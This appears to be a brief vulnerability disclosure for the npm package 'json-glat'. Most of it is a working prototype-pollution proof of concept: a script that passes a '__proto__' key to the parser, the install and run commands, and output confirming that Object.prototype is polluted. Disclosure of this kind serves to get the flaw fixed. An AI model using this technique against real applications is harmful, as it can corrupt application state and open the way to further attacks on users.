# Description

`json-glat` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var jsonGlat = require("json-glat")
console.log("Before : " + {}.polluted);
jsonGlat.parse({'__proto__.polluted': 'Yes! Its Polluted'});
console.log("After : " + {}.polluted);
```

2. Execute the following commands in terminal:

```
npm i json-glat # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
